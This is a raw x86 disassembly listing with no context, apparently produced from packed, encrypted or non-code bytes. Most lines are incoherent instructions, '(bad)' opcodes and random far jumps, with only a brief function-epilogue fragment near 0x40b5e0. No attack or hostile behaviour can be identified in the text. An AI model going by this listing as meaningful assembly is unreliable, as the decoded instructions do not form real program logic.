  40b036:	stos   BYTE PTR es:[edi],al
  40b037:	scas   al,BYTE PTR es:[edi]
  40b038:	inc    edx
  40b039:	mov    bl,0xc0
  40b03b:	popa   
  40b03c:	(bad)  
  40b03d:	jns    0x40b016
  40b03f:	and    al,0x2f
  40b041:	repz sbb eax,0xc7fd59df
  40b047:	aam    0xbe
  40b049:	aaa    
  40b04a:	(bad)  
  40b04c:	(bad)  
  40b04d:	imul   esi,DWORD PTR [esi+0x69],0x18
  40b051:	sbb    ecx,DWORD PTR [edi+0x5d62dd2b]
  40b057:	xor    bh,BYTE PTR [ebp+0x6]
  40b05a:	jno    0x40b0af
  40b05c:	jle    0x40aff9
  40b05e:	or     DWORD PTR [ebp-0x40],edx
  40b061:	xor    DWORD PTR [edi+0x2bf35dd6],ebx
  40b067:	add    eax,0xf4ab59c
  40b06c:	mov    edx,ebx
  40b06e:	jl     0x40b0ee
  40b070:	sti    
  40b071:	add    ah,BYTE PTR [edx]
  40b073:	outs   dx,BYTE PTR ds:[esi]
  40b074:	xchg   esp,eax
  40b075:	add    al,0x95
  40b077:	stos   DWORD PTR es:[edi],eax
  40b078:	mov    dh,0xb8
  40b07a:	dec    esp
  40b07b:	xor    eax,0xc2353dce
  40b080:	and    eax,DWORD PTR [ebp+0x1b3a9ae6]
  40b086:	fld    DWORD PTR ds:0xe8de141d
  40b08c:	fcomp  QWORD PTR [eax-0x621cef16]
  40b092:	xor    eax,0xc762a94e
  40b097:	pushf  
  40b098:	push   0x8346dd46
  40b09d:	addr16 jne 0x40b058
  40b0a0:	jg     0x40b0eb
  40b0a2:	lods   al,BYTE PTR ds:[esi]
  40b0a3:	test   al,0x9c
  40b0a5:	and    eax,0xf1b9aafa
  40b0aa:	rol    DWORD PTR [ecx+0x68],cl
  40b0ad:	mov    ch,0xc1
  40b0af:	(bad)  
  40b0b0:	mov    al,ds:0x337b2fb7
  40b0b5:	mov    bh,0x85
  40b0b7:	js     0x40b12c
  40b0b9:	xlat   BYTE PTR ds:[ebx]
  40b0ba:	mov    esi,0xa90e9fa6
  40b0bf:	es jno 0x40b069
  40b0c2:	je     0x40b0fa
  40b0c4:	scas   al,BYTE PTR es:[edi]
  40b0c5:	(bad)  
  40b0c6:	and    ebp,edx
  40b0c8:	(bad)  
  40b0c9:	pop    ebx
  40b0ca:	mov    ds:0x7d7a0bc,al
  40b0cf:	(bad)  
  40b0d0:	mov    ss,WORD PTR [ebx]
  40b0d2:	std    
  40b0d3:	dec    edi
  40b0d4:	xor    al,0x3e
  40b0d6:	loope  0x40b06f
  40b0d8:	imul   ecx,DWORD PTR [esi+edx*8+0x443def1e],0x3062c9a6
  40b0e3:	jg     0x40b08a
  40b0e5:	shl    DWORD PTR es:[ebp+0x35],1
  40b0e9:	cld    
  40b0ea:	sbb    BYTE PTR [ebx+eiz*4+0x50],dl
  40b0ee:	jmp    0x614d:0xb4d9588e
  40b0f5:	mov    ebp,DWORD PTR [eax]
  40b0f7:	cmp    ah,BYTE PTR [ebx-0x4378e80c]
  40b0fd:	fistp  WORD PTR [eax+ebx*1+0x43d528]
  40b104:	sbb    al,0xad
  40b106:	pop    ds
  40b107:	xor    eax,0xac0128f0
  40b10c:	fs mov ebp,0x5267d9e2
  40b112:	adc    esp,edi
  40b114:	mov    bh,0xa4
  40b116:	int3   
  40b117:	jbe    0x40b10e
  40b119:	push   ss
  40b11a:	add    al,0xdb
  40b11c:	arpl   cx,si
  40b11e:	add    DWORD PTR [eax-0x4d505450],0x58
  40b125:	or     eax,0x7df844e8
  40b12a:	jnp    0x40b10e
  40b12c:	xchg   DWORD PTR [edi-0x24346a26],ebx
  40b132:	icebp  
  40b133:	dec    ebx
  40b134:	out    0x15,al
  40b136:	mov    ch,0xb1
  40b138:	and    DWORD PTR [ecx+0x6e5ffb15],edx
  40b13e:	mov    edx,ecx
  40b140:	(bad)  
  40b141:	(bad)  
  40b142:	push   eax
  40b143:	adc    eax,eax
  40b145:	push   eax
  40b146:	jae    0x40b19f
  40b148:	rcl    DWORD PTR [bx-0x6297],0x39
  40b14e:	jnp    0x40b162
  40b150:	inc    sp
  40b152:	jo     0x40b131
  40b154:	sahf   
  40b155:	and    al,0x77
  40b157:	stos   BYTE PTR es:[edi],al
  40b158:	test   al,0x96
  40b15a:	daa    
  40b15b:	test   eax,0x912e382f
  40b160:	xor    DWORD PTR [esi-0x18],ecx
  40b163:	repz pop ebx
  40b165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b166:	inc    edi
  40b167:	inc    edi
  40b168:	out    0xf,eax
  40b16a:	stos   BYTE PTR es:[edi],al
  40b16b:	outs   dx,BYTE PTR ds:[esi]
  40b16c:	or     BYTE PTR [ecx],bl
  40b16e:	data16 clc 
  40b170:	dec    ebp
  40b171:	pop    ecx
  40b172:	in     al,dx
  40b173:	mov    dl,0x74
  40b175:	push   ss
  40b176:	sbb    dh,dh
  40b178:	daa    
  40b179:	ret    0xe6a0
  40b17c:	std    
  40b17d:	fnsave [edx+0x6d182666]
  40b183:	pusha  
  40b184:	mov    esp,0x38e4113d
  40b189:	outs   dx,BYTE PTR ds:[esi]
  40b18a:	cmp    BYTE PTR [eax],bh
  40b18c:	push   es
  40b18d:	ins    DWORD PTR es:[edi],dx
  40b18e:	(bad)  
  40b190:	aaa    
  40b191:	xor    ah,BYTE PTR [esi]
  40b193:	pop    edi
  40b194:	inc    esp
  40b195:	fld    DWORD PTR [edi]
  40b197:	add    DWORD PTR [edi+esi*2+0x7c696f85],eax
  40b19e:	nop
  40b19f:	or     al,0xb0
  40b1a1:	and    BYTE PTR [ebx-0x278b6daf],bh
  40b1a7:	xor    ah,0x5
  40b1aa:	fdivp  st(2),st
  40b1ac:	mov    al,0x65
  40b1ae:	cmp    DWORD PTR [esi],0xfffffff3
  40b1b1:	lods   al,BYTE PTR ds:[esi]
  40b1b2:	mov    eax,0x7aa9335
  40b1b7:	stc    
  40b1b8:	xchg   edi,eax
  40b1b9:	add    al,0x2c
  40b1bb:	mov    edx,gs
  40b1bd:	pop    ecx
  40b1be:	push   ecx
  40b1bf:	ins    DWORD PTR es:[edi],dx
  40b1c0:	xchg   ecx,eax
  40b1c1:	repnz addr16 pop ecx
  40b1c4:	fstp   TBYTE PTR [esi+eiz*2-0x1cbb8ad9]
  40b1cb:	adc    DWORD PTR [esi-0x44],ebp
  40b1ce:	fidivr DWORD PTR [edi]
  40b1d0:	ret    
  40b1d1:	(bad)  
  40b1d2:	scas   al,BYTE PTR es:[edi]
  40b1d3:	or     eax,0xd9c3a852
  40b1d8:	lea    ebp,[esi-0x443d57e3]
  40b1de:	or     ah,BYTE PTR [esp+ebx*1]
  40b1e1:	es sub dl,al
  40b1e4:	add    eax,0x44f059fb
  40b1e9:	dec    ecx
  40b1ea:	xchg   ebx,eax
  40b1eb:	fld1   
  40b1ed:	mov    ds:0xfffcc417,eax
  40b1f2:	sbb    BYTE PTR ds:0x6f229257,0x28
  40b1f9:	ret    0xd70b
  40b1fc:	fwait
  40b1fd:	inc    esp
  40b1fe:	push   edi
  40b1ff:	push   edi
  40b200:	jmp    0x78f8900b
  40b205:	or     DWORD PTR [eax+0x19],edi
  40b208:	jnp    0x40b18e
  40b20a:	loop   0x40b190
  40b20c:	repz cdq 
  40b20e:	sub    ebp,edx
  40b210:	xlat   BYTE PTR ds:[ebx]
  40b211:	adc    BYTE PTR [ecx+0x12],bl
  40b214:	add    dh,BYTE PTR [ecx]
  40b216:	ss sub al,0x44
  40b219:	dec    edi
  40b21a:	ja     0x40b203
  40b21c:	test   DWORD PTR fs:[bp-0x4d5c],ebx
  40b222:	test   eax,0xc9c538ec
  40b227:	dec    esp
  40b228:	adc    DWORD PTR ds:[eax-0x50],esi
  40b22c:	jno    0x40b25d
  40b22e:	rol    WORD PTR [ebx-0x535bf8c4],0x80
  40b236:	sti    
  40b237:	enter  0x3eb5,0xc1
  40b23b:	inc    esi
  40b23c:	aad    0x7e
  40b23e:	push   esp
  40b23f:	push   esp
  40b240:	xor    ebp,DWORD PTR [edi]
  40b242:	and    BYTE PTR [ebp+0x74419e2],ch
  40b248:	xchg   edx,eax
  40b249:	enter  0xd092,0x19
  40b24d:	add    bl,BYTE PTR [edi+0x76]
  40b250:	mov    BYTE PTR [ecx],ah
  40b252:	cld    
  40b253:	jno    0x40b2b2
  40b255:	fstp   TBYTE PTR [eax-0x67]
  40b258:	loopne 0x40b240
  40b25a:	pop    ebx
  40b25b:	call   0xb05c:0xca49c939
  40b262:	push   esi
  40b263:	in     al,dx
  40b264:	pop    esp
  40b265:	scas   al,BYTE PTR es:[edi]
  40b266:	call   0x85d84b18
  40b26b:	daa    
  40b26c:	cmp    edi,ecx
  40b26e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b26f:	(bad)  
  40b270:	cmp    BYTE PTR [edx+edi*1],dl
  40b273:	mov    ebp,0x897732
  40b278:	(bad)  
  40b279:	je     0x40b2b2
  40b27b:	aas    
  40b27c:	xchg   edx,eax
  40b27d:	sub    BYTE PTR [edi-0x354ed46d],bl
  40b283:	lahf   
  40b284:	xchg   DWORD PTR [ebx-0x3a],ebp
  40b287:	dec    esi
  40b288:	and    dh,BYTE PTR ds:0xc7f1882b
  40b28e:	sbb    esp,ecx
  40b290:	cwde   
  40b291:	push   es
  40b292:	fisubr DWORD PTR ds:0x9fa290ef
  40b298:	adc    ebx,eax
  40b29a:	jl     0x40b311
  40b29c:	cli    
  40b29d:	les    ebx,FWORD PTR [eax+0x2a]
  40b2a0:	in     al,0x26
  40b2a2:	loopne 0x40b2b9
  40b2a4:	out    dx,eax
  40b2a5:	sbb    DWORD PTR [ecx],eax
  40b2a7:	jno    0x40b240
  40b2a9:	mov    ecx,0x7d736fdc
  40b2ae:	std    
  40b2af:	sub    eax,0xeac81259
  40b2b4:	pop    esp
  40b2b5:	add    dl,al
  40b2b7:	dec    ecx
  40b2b8:	push   cs
  40b2b9:	mov    WORD PTR ds:0x82927a76,?
  40b2bf:	jmp    0x40b5d8
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0x7d8b132
  40b2d2:	repz xchg esi,eax
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	sbb    al,0x59
  40b2de:	mov    al,ds:0x69be57be
  40b2e3:	retf   
  40b2e4:	inc    ecx
  40b2e5:	xchg   ebx,eax
  40b2e6:	add    ecx,DWORD PTR [ecx+0x51725964]
  40b2ec:	sbb    BYTE PTR [edi+0x4],dl
  40b2ef:	jmp    0x40b34b
  40b2f1:	cwde   
  40b2f2:	xor    BYTE PTR [ebp-0x48a9507],bl
  40b2f8:	adc    BYTE PTR [eax],al
  40b2fa:	push   ebx
  40b2fb:	call   0xdfa3b725
  40b300:	mov    edx,0xcd1c5d72
  40b305:	pop    edx
  40b306:	xor    esi,DWORD PTR [ebp-0xe527972]
  40b30c:	(bad)  
  40b30d:	imul   ecx,DWORD PTR [edx-0x5a],0xee79e4de
  40b314:	dec    ebx
  40b315:	push   esp
  40b316:	lds    ecx,FWORD PTR [eax+0x439f7eeb]
  40b31c:	out    dx,al
  40b31d:	in     eax,0xd2
  40b31f:	sub    DWORD PTR [esi],ebp
  40b321:	hlt    
  40b322:	mov    esi,0xb41f2065
  40b327:	test   DWORD PTR [edi-0x5d],0xa52ee699
  40b32e:	mov    edx,0x8cf59af5
  40b333:	sbb    BYTE PTR [ecx],bh
  40b335:	ins    BYTE PTR es:[edi],dx
  40b336:	or     bh,ah
  40b338:	rcr    BYTE PTR [ecx+0x3be4864f],0x7a
  40b33f:	xor    ah,al
  40b341:	sahf   
  40b342:	pop    ecx
  40b343:	push   0x80caae11
  40b348:	arpl   WORD PTR [ecx],ax
  40b34a:	(bad)  
  40b34b:	es or  eax,0xbfa99dcd
  40b351:	jge    0x40b2e1
  40b353:	push   es
  40b354:	shr    ch,0xd
  40b357:	or     eax,0x2681ea59
  40b35c:	jmp    0x2a59:0xe92924e7
  40b363:	mov    cl,0x3d
  40b365:	and    esi,DWORD PTR [ebx+0x1750c09]
  40b36b:	push   0xffffffdc
  40b36d:	add    bl,BYTE PTR [ebx-0x23]
  40b370:	mov    eax,ds:0x102d4ea8
  40b375:	cmp    DWORD PTR [eax-0x29],esi
  40b378:	(bad)  
  40b379:	mov    ecx,0x15478dde
  40b37e:	in     al,dx
  40b37f:	imul   edi,edi,0xcb619f0e
  40b385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b386:	pusha  
  40b387:	sbb    DWORD PTR [ecx-0x4f65a7f8],esi
  40b38d:	(bad)  
  40b38e:	push   0x33132fd2
  40b393:	dec    ecx
  40b394:	lock test ah,ch
  40b397:	sub    eax,0x27756610
  40b39c:	or     DWORD PTR ds:0x76e0666f,esi
  40b3a2:	repnz aas 
  40b3a4:	ror    BYTE PTR [esi+0x52cdb90c],1
  40b3aa:	cs push esi
  40b3ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3ad:	adc    DWORD PTR [ecx-0x37b84140],edi
  40b3b3:	push   edi
  40b3b4:	scas   al,BYTE PTR es:[edi]
  40b3b5:	ins    BYTE PTR es:[edi],dx
  40b3b6:	mov    esi,0xb9cb35d6
  40b3bb:	js     0x40b377
  40b3bd:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40b3bf:	inc    edi
  40b3c0:	hlt    
  40b3c1:	adc    bl,bh
  40b3c3:	call   0x222:0x4b3b1328
  40b3ca:	pop    edi
  40b3cb:	nop
  40b3cc:	mov    DWORD PTR [esi+0x2605b39b],0x96459e30
  40b3d6:	jmp    0xf024:0x85f955ab
  40b3dd:	lds    ecx,FWORD PTR [edx]
  40b3df:	inc    esp
  40b3e0:	cmp    al,0x65
  40b3e2:	pop    bx
  40b3e4:	test   eax,0x4a40630d
  40b3e9:	sub    al,0x1
  40b3eb:	or     ch,0x90
  40b3ee:	popa   
  40b3ef:	and    BYTE PTR [ebx],ah
  40b3f1:	and    eax,0xcb89f57d
  40b3f6:	leave  
  40b3f7:	or     ebp,DWORD PTR [bp+si+0x1a]
  40b3fb:	xchg   ebx,eax
  40b3fc:	sbb    al,0x55
  40b3fe:	jmp    0xc8c9:0xac3f56c4
  40b405:	imul   edx,DWORD PTR [esp+eax*2],0xfffffff7
  40b409:	and    al,0xc9
  40b40b:	arpl   si,bp
  40b40d:	mov    edi,0xe697d81c
  40b412:	cwde   
  40b413:	lahf   
  40b414:	stc    
  40b415:	dec    ecx
  40b416:	mov    ds:0xd0453b49,al
  40b41b:	aas    
  40b41c:	scas   al,BYTE PTR es:[edi]
  40b41d:	in     al,dx
  40b41e:	sbb    BYTE PTR [edx+edx*8-0x558f6aef],bl
  40b425:	pusha  
  40b426:	dec    esp
  40b427:	pop    es
  40b428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b429:	pop    es
  40b42a:	xchg   esp,eax
  40b42b:	dec    edi
  40b42c:	and    dh,bl
  40b42e:	sti    
  40b42f:	mov    al,0x7b
  40b431:	imul   ecx,DWORD PTR [ebx],0xffffffc3
  40b434:	sub    ebp,edi
  40b436:	adc    ebp,ebx
  40b438:	pop    edi
  40b439:	inc    esp
  40b43a:	iret   
  40b43b:	mov    al,0x42
  40b43d:	jecxz  0x40b479
  40b43f:	dec    ecx
  40b440:	icebp  
  40b441:	push   edx
  40b442:	fwait
  40b443:	push   edi
  40b444:	test   al,0x19
  40b446:	enter  0x7a81,0x1
  40b44a:	and    BYTE PTR [edi+0x9162862],bl
  40b450:	push   edi
  40b451:	sbb    ah,BYTE PTR [edx-0x30f63ecd]
  40b457:	lock scas eax,DWORD PTR es:[edi]
  40b459:	mov    ebp,0xc677448a
  40b45e:	jns    0x40b465
  40b460:	mov    gs,edi
  40b462:	or     eax,0x9be75cdb
  40b467:	inc    eax
  40b468:	or     esp,ebx
  40b46a:	das    
  40b46b:	jns    0x40b4b9
  40b46d:	mov    eax,eax
  40b46f:	pop    eax
  40b470:	xchg   ebx,eax
  40b471:	sahf   
  40b472:	push   ebp
  40b473:	mov    ds:0x4a4378e9,al
  40b478:	sbb    cl,al
  40b47a:	rcl    DWORD PTR [edx+0x6f88e0e5],1
  40b480:	lods   eax,DWORD PTR ds:[esi]
  40b481:	jmp    0x8d71ab05
  40b486:	inc    esi
  40b487:	mov    edx,0x8efcc26b
  40b48c:	shl    DWORD PTR [esi+0x14],1
  40b48f:	cdq    
  40b490:	jae    0x40b489
  40b492:	clc    
  40b493:	pop    edx
  40b494:	xchg   esp,eax
  40b495:	push   es
  40b496:	fistp  DWORD PTR [edi+0x52]
  40b499:	jmp    0x40b46e
  40b49b:	inc    ecx
  40b49c:	ins    BYTE PTR es:[edi],dx
  40b49d:	retf   
  40b49e:	mov    eax,0xa8903468
  40b4a3:	cmc    
  40b4a4:	lods   al,BYTE PTR ds:[esi]
  40b4a5:	pop    ds
  40b4a6:	lods   al,BYTE PTR ds:[esi]
  40b4a7:	dec    edx
  40b4a8:	mov    esp,0x7493c779
  40b4ad:	je     0x40b4aa
  40b4af:	dec    edi
  40b4b0:	push   esp
  40b4b1:	mov    ebx,0xbfb87d64
  40b4b6:	or     esp,DWORD PTR [edx]
  40b4b8:	shl    DWORD PTR [edi+0x61702330],0xc4
  40b4bf:	aad    0x4a
  40b4c1:	push   ds
  40b4c2:	fcom   DWORD PTR [edx+0x7c252615]
  40b4c8:	imul   edi,DWORD PTR [esi+0x64],0xba13fbc4
  40b4cf:	cld    
  40b4d0:	and    cl,BYTE PTR ds:0x8c1b7725
  40b4d6:	jp     0x40b4b8
  40b4d8:	enter  0xfe5c,0x5
  40b4dc:	stos   DWORD PTR es:[edi],eax
  40b4dd:	call   0xf0:0x684e1be3
  40b4e4:	add    BYTE PTR [ebx],0x9e
  40b4e7:	je     0x40b55d
  40b4e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4ea:	cmp    edi,ebx
  40b4ec:	push   0xe5816602
  40b4f1:	aad    0xe1
  40b4f3:	das    
  40b4f4:	xchg   esi,eax
  40b4f5:	out    0xb1,eax
  40b4f7:	sbb    eax,0x7c236094
  40b4fc:	adc    eax,0xf9b3810b
  40b501:	(bad)  
  40b502:	cli    
  40b503:	inc    ebp
  40b504:	add    ch,BYTE PTR [ecx]
  40b506:	cwde   
  40b507:	pop    esi
  40b508:	xchg   esi,eax
  40b509:	je     0x40b4dd
  40b50b:	push   0x1
  40b50d:	mov    ds:0xc2587ebe,al
  40b512:	jne    0x40b4c4
  40b514:	adc    al,0xb1
  40b516:	stc    
  40b517:	mov    dl,0x52
  40b519:	lahf   
  40b51a:	cwde   
  40b51b:	mov    eax,ds:0x1409083e
  40b520:	loopne 0x40b53a
  40b522:	push   edx
  40b523:	add    bl,BYTE PTR ds:0x10478112
  40b529:	xor    DWORD PTR [ebp-0x45],0xffffffe4
  40b52d:	into   
  40b52e:	add    BYTE PTR [edi],cl
  40b530:	xlat   BYTE PTR ds:[ebx]
  40b531:	or     DWORD PTR [ecx],0xffffff8b
  40b534:	leave  
  40b535:	imul   eax,ecx,0xcceb23d1
  40b53b:	scas   al,BYTE PTR es:[edi]
  40b53c:	and    eax,0x6f0312cf
  40b541:	cld    
  40b542:	inc    ebx
  40b543:	loop   0x40b511
  40b545:	cmp    dl,bh
  40b547:	pop    edi
  40b548:	ds jnp 0x40b51e
  40b54b:	ret    0xe69
  40b54e:	stos   DWORD PTR es:[edi],eax
  40b54f:	(bad)  
  40b551:	arpl   bx,si
  40b553:	in     eax,0xa
  40b555:	sub    BYTE PTR cs:[edi+ebp*1-0x3c],bl
  40b55a:	push   edx
  40b55b:	call   DWORD PTR [edi-0x1]
  40b55e:	mov    cl,0xf8
  40b560:	out    0xdd,eax
  40b562:	push   cs
  40b563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b564:	scas   al,BYTE PTR es:[edi]
  40b565:	jnp    0x40b559
  40b567:	not    DWORD PTR [edx-0x44adb1ce]
  40b56d:	ficomp DWORD PTR [ecx-0x66]
  40b570:	out    0xf9,eax
  40b572:	ret    0x26bd
  40b575:	add    dh,bl
  40b577:	stos   DWORD PTR es:[edi],eax
  40b578:	xchg   ebx,eax
  40b579:	in     al,dx
  40b57a:	mov    ds:0x99ad8704,al
  40b57f:	add    eax,0x7eae7ee2
  40b584:	xchg   ebx,eax
  40b585:	hlt    
  40b586:	cld    
  40b587:	dec    eax
  40b588:	add    cl,BYTE PTR [eax+0x5be5768c]
  40b58e:	ror    DWORD PTR [eax-0x2373e0ec],cl
  40b594:	and    eax,0xe1c76f29
  40b599:	lds    eax,FWORD PTR ds:0xaa295581
  40b59f:	retf   
  40b5a0:	mov    ecx,ecx
  40b5a2:	test   eax,0x895d5d1
  40b5a7:	clc    
  40b5a8:	xchg   edi,eax
  40b5a9:	xchg   esp,eax
  40b5aa:	fidivr WORD PTR [esi+0x3b]
  40b5ad:	pop    edi
  40b5ae:	or     BYTE PTR [edx-0x6e8f5427],al
  40b5b4:	or     dl,BYTE PTR [edi]
  40b5b6:	inc    ebx
  40b5b7:	sub    al,0xa2
  40b5b9:	out    dx,eax
  40b5ba:	cwde   
  40b5bb:	jg     0x40b55f
  40b5bd:	shl    BYTE PTR [edi-0x9],cl
  40b5c0:	jns    0x40b5b0
  40b5c2:	mov    dh,0x1b
  40b5c4:	loope  0x40b62f
  40b5c6:	fisttp WORD PTR ds:[esi]
  40b5c9:	retf   
  40b5ca:	xor    al,0x73
  40b5cc:	xchg   ecx,eax
  40b5cd:	loop   0x40b60e
  40b5cf:	adc    al,0x41
  40b5d1:	mov    dh,0x9b
  40b5d3:	cld    
  40b5d4:	ins    DWORD PTR es:[edi],dx
  40b5d5:	lds    esp,FWORD PTR [eax-0x60]
  40b5d8:	je     0x40b5f5
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi+0x18ccd584]
  40b60d:	mov    ds:0x8fca572c,eax
  40b612:	js     0x40b68c
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	test   BYTE PTR [edx-0x679ec042],dl
  40b61e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b61f:	and    eax,0xc0e301e8
  40b624:	test   eax,0xb4ce080f
  40b629:	cmc    
  40b62a:	or     ebp,DWORD PTR [ecx+0x695c8590]
  40b630:	pusha  
  40b631:	or     DWORD PTR [esi-0x5b],edx
  40b634:	lods   eax,DWORD PTR ds:[esi]
  40b635:	mov    ds:0x9975478e,al
  40b63a:	dec    ebx
  40b63b:	push   ds
  40b63c:	pop    esi
  40b63d:	or     BYTE PTR [ebx-0x39],ah
  40b640:	fst    QWORD PTR [ebx+0x7a389fa0]
  40b646:	and    eax,0xaabf7a17
  40b64b:	test   eax,0x33f8f415
  40b650:	mov    ecx,ecx
  40b652:	inc    ecx
  40b653:	xchg   edx,eax
  40b654:	pop    ss
  40b655:	adc    ch,BYTE PTR [edi+0x64]
  40b658:	push   ds
  40b659:	push   ecx
  40b65a:	aaa    
  40b65b:	add    cl,bh
  40b65d:	push   edx
  40b65e:	pop    ebp
  40b65f:	loop   0x40b5eb
  40b661:	dec    ebp
  40b662:	dec    edi
  40b663:	enter  0xf930,0x9a
  40b667:	push   0xfffffff7
  40b669:	xchg   ebx,eax
  40b66a:	mov    dh,0xe8
  40b66c:	mov    WORD PTR [eax+0x30],es
  40b66f:	data16 outs dx,BYTE PTR ds:[esi]
  40b671:	jecxz  0x40b691
  40b673:	(bad)  
  40b674:	mov    esi,0x72bafa21
  40b679:	imul   esp,edi,0x8a8b0110
  40b67f:	sbb    bl,BYTE PTR [eax-0xafc8425]
  40b685:	xor    bl,BYTE PTR [eax]
  40b687:	bnd jmp 0x40b679
  40b68a:	data16 or al,0xaf
  40b68d:	adc    ecx,DWORD PTR [esi-0x5a]
  40b690:	adc    eax,DWORD PTR [edi+0x5dc2553d]
  40b696:	sbb    eax,0xad14ae10
  40b69b:	adc    eax,0x2f1ebbff
  40b6a0:	shl    eax,1
  40b6a2:	in     eax,dx
  40b6a3:	jns    0x40b707
  40b6a5:	pop    es
  40b6a6:	jp     0x40b69e
  40b6a8:	sbb    eax,0xbc3e6cd3
  40b6ad:	sbb    bh,al
  40b6af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b0:	sbb    ah,BYTE PTR [eax+0x4c]
  40b6b3:	add    ebx,DWORD PTR ds:0x28bfd97c
  40b6b9:	fidivr DWORD PTR [eax+eiz*8-0x3203dd9c]
  40b6c0:	or     bh,ah
  40b6c2:	ds fwait
  40b6c4:	jb     0x40b6b1
  40b6c6:	and    ecx,DWORD PTR [edx]
  40b6c8:	popa   
  40b6c9:	ds ss call 0x4465776f
  40b6d0:	push   esi
  40b6d1:	xor    al,0x7a
  40b6d3:	xor    eax,ebp
  40b6d5:	mov    eax,0xf79a8992
  40b6da:	dec    edx
  40b6db:	pushf  
  40b6dc:	push   esp
  40b6dd:	inc    eax
  40b6de:	cs (bad) 
  40b6e0:	ror    DWORD PTR [ebx-0x65511d3a],1
  40b6e6:	ja     0x40b6b2
  40b6e8:	sub    BYTE PTR [eax+esi*1],ch
  40b6eb:	call   0xcf92:0xd48373cd
  40b6f2:	call   0xf2f7:0xb74bebe7
  40b6f9:	rcl    edx,0xf8
  40b6fc:	(bad)  
  40b6fd:	popf   
  40b6fe:	dec    ecx
  40b6ff:	add    BYTE PTR [esi+0x5b],0x4e
  40b703:	ret    0x3e0a
  40b706:	mov    dh,0xbd
  40b708:	cld    
  40b709:	lods   al,BYTE PTR ds:[esi]
  40b70a:	push   edi
  40b70b:	push   ebx
  40b70c:	inc    esp
  40b70d:	inc    eax
  40b70e:	xor    ecx,DWORD PTR gs:0xacb9ed60
  40b715:	ins    DWORD PTR es:[edi],dx
  40b716:	or     al,0xd7
  40b718:	or     ch,dh
  40b71a:	mov    es,WORD PTR [ecx+0x28ba4634]
  40b720:	sbb    eax,0x2c13bd17
  40b725:	or     eax,0xf5e84e88
  40b72a:	leave  
  40b72b:	xor    DWORD PTR [ecx+edx*1],edi
  40b72e:	call   0xb068:0xb02b8a60
  40b735:	test   BYTE PTR [esi],bl
  40b737:	mov    ds:0x576c1aea,al
  40b73c:	outs   dx,DWORD PTR cs:[esi]
  40b73e:	(bad)  
  40b73f:	jne    0x40b72f
  40b741:	inc    ecx
  40b742:	mov    ebx,0xe2af50d7
  40b747:	ins    BYTE PTR es:[edi],dx
  40b748:	lock bound ecx,QWORD PTR [ecx+0x27]
  40b74c:	ds in  al,0xe0
  40b74f:	sub    al,0x6e
  40b751:	rol    esi,cl
  40b753:	xchg   edx,eax
  40b754:	(bad)  ds:0xdff54961
  40b75a:	stos   BYTE PTR es:[edi],al
  40b75b:	pop    ds
  40b75c:	repz loop 0x40b738
  40b75f:	mov    cl,0x9b
  40b761:	stc    
  40b762:	daa    
  40b763:	inc    ebp
  40b764:	sbb    DWORD PTR [eax+0x1aa2cbf6],edi
  40b76a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b76b:	jp     0x40b77c
  40b76d:	push   esp
  40b76e:	push   0x72
  40b770:	(bad)  
  40b771:	mov    esp,0xd7be7515
  40b776:	and    DWORD PTR [edx+esi*1],0xffffff89
  40b77a:	push   ds
  40b77b:	xchg   edi,eax
  40b77c:	in     al,dx
  40b77d:	push   edi
  40b77e:	popa   
  40b77f:	xchg   edx,eax
  40b780:	dec    edx
  40b781:	lds    ecx,FWORD PTR [esi]
  40b783:	dec    DWORD PTR [esi]
  40b785:	sbb    BYTE PTR [ebx-0x37],ch
  40b788:	push   ds
  40b789:	sub    ebp,ebp
  40b78b:	mov    ds:0x21812927,eax
  40b790:	inc    ebp
  40b791:	fistp  QWORD PTR [ecx+0x15f3f4e9]
  40b797:	xor    edx,DWORD PTR [esi+0x26]
  40b79a:	cmc    
  40b79b:	push   edi
  40b79c:	ret    
  40b79d:	inc    eax
  40b79e:	out    dx,al
  40b79f:	js     0x40b7a1
  40b7a1:	mov    al,BYTE PTR [edi]
  40b7a3:	imul   ecx,DWORD PTR [ebx-0x6d],0x60
  40b7a7:	or     bl,BYTE PTR [eax+0xbfcdbc7]
  40b7ad:	and    esi,DWORD PTR [esi*2+0x6bfded88]
  40b7b4:	or     al,0x7f
  40b7b6:	(bad)  
  40b7b7:	fbld   TBYTE PTR [edx+ebx*1]
  40b7ba:	cmp    eax,0xf172b6a0
  40b7bf:	mov    eax,0x370a1384
  40b7c4:	or     al,0xec
  40b7c6:	or     ebx,DWORD PTR [ebp+ecx*2+0x8]
  40b7ca:	dec    ebp
  40b7cb:	hlt    
  40b7cc:	mov    eax,ds:0x9d7f8794
  40b7d1:	jp     0x40b83d
  40b7d3:	mov    eax,0x55004d2b
  40b7d8:	pop    es
  40b7d9:	push   esp
  40b7da:	mov    DWORD PTR [eax],ecx
